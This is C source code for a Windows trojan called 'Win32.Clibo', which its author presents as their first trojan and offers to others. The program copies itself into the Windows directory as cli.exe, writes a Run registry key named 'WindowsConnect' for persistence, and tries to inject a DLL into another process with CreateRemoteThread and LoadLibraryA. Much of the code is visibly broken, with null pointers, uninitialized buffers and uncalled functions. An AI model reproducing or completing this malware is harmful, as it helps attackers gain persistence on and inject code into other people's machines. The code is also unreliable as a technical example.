/*  Win32.Clibo.
/*  This is my first Win32 trojan.
/* Description: This Trojan i' create in classic version, to infect and seed my and your way in world of system.
/* in my trojan i' give small dll code to better and faster work people with Clibo.
/* Autor: Xriso / MASSLIBRARY
/* GREET thanks: Carol, Luna, Baga, Undermine and Mary.J 
*/

#include <windows.h>
#include <iprtrmib.h>
#include <profile.h>
#include <rpcproxy.h>
#include <winsock2.h>
#include <wsnetbs.h>
#define CREATE_THREAD_ACCESS (PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ)

void Copy(void)
{
	char FName[256],String[256];;
	GetModuleFileName(0,FName,256);
	GetWindowsDirectory(String,255);
	lstrcat(String,"\\cli.exe");
	CopyFile(FName,String,TRUE);
}

void Autorun(void)
{
	char String[256];
	HKEY hKey;
	GetWindowsDirectory(String,255);
	lstrcat(String,"\\cli.exe");
	 RegCreateKey (HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
     RegSetValueEx (hKey, "WindowsConnect", 0, REG_SZ, (LPBYTE)String, sizeof(String));
}

void Dynamiclinklibrary(void)
{
	HKEY hKey;
	RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
    HANDLE Proc;
	HMODULE hLib;
    char buf[50] = {0};	
    LPVOID RemoteString, LoadLibAddy; 
	Proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 0); 
	if(!Proc)
	{
	   sprintf(buf, "OpenProcess() failed: %d", GetLastError());
	   printf(buf);
	}
	LoadLibAddy = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
	RemoteString = (LPVOID)VirtualAllocEx(Proc, NULL, strlen(NULL), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	WriteProcessMemory(Proc, (LPVOID)RemoteString, NULL, strlen(NULL), NULL);
	CreateRemoteThread(Proc, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibAddy, (LPVOID)RemoteString, NULL, NULL);	
}

int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
    HKEY hKey;
    char string[MAX_PATH],dll[368],ntldr[MAX_PATH];
    HANDLE virusfd = NULL,ntldrfd = NULL;
    if(RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    0,KEY_QUERY_VALUE,&hKey) != ERROR_SUCCESS)
    {       
	printf("open cli.exe %s\n",NULL);
    }
    if((virusfd = CreateFile(string,GENERIC_WRITE,FILE_SHARE_WRITE,NULL,
    CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL)) == INVALID_HANDLE_VALUE)
    {
        ExitProcess(0);
    }
    if((ntldrfd = CreateFile(ntldr,GENERIC_WRITE,FILE_SHARE_WRITE,NULL,
    CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL)) == INVALID_HANDLE_VALUE)
    {
        ExitProcess(0);
    }
    ShellExecute(NULL,"open","cli.exe",NULL,NULL,SW_SHOW);
	Copy();
	Dynamiclinklibrary();
    ExitProcess(1);
}
